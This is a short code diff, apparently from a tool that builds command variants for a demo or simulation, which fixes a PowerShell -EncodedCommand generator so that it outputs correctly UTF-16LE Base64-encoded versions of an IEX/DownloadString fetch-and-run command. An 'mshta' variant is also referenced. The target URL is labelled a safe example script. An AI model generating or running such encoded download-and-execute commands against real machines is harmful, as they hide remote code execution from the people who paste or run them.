@@ -739,7 +739,14 @@ const SAFE_SCRIPT_UNIX = `${baseUrl}/static/example.sh`;
     }
     if (v === 'powershell-enc') {
         const cmd = `IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')`;
-        const b64 = btoa(cmd.split('').map(c => c.charCodeAt(0)).join('')); // Simple mock b64
+        // PowerShell -EncodedCommand expects Base64-encoded UTF-16LE
+        const charCodes = [];
+        for (let i = 0; i < cmd.length; i++) {
+            const code = cmd.charCodeAt(i);
+            charCodes.push(code & 0xff); // Low byte
+            charCodes.push((code >> 8) & 0xff); // High byte (always 0 for ASCII)
+        }
+        const b64 = btoa(String.fromCharCode(...charCodes));
         return `powershell -Enc ${b64}`;
     }
     if (v === 'mshta') {
